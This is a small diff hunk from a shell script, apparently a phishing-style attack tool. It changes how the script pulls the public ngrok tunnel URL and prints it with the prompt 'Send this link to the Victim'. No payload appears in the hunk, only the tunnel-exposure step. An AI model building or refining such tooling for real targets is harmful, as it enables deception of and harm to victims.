@@ -337,7 +337,7 @@ tunnel() {
     ./ngrok http 3333 > /dev/null 2>&1 &
     sleep 10
 
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
     printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} %s \n" $link
     printf "\n"
     checkfound
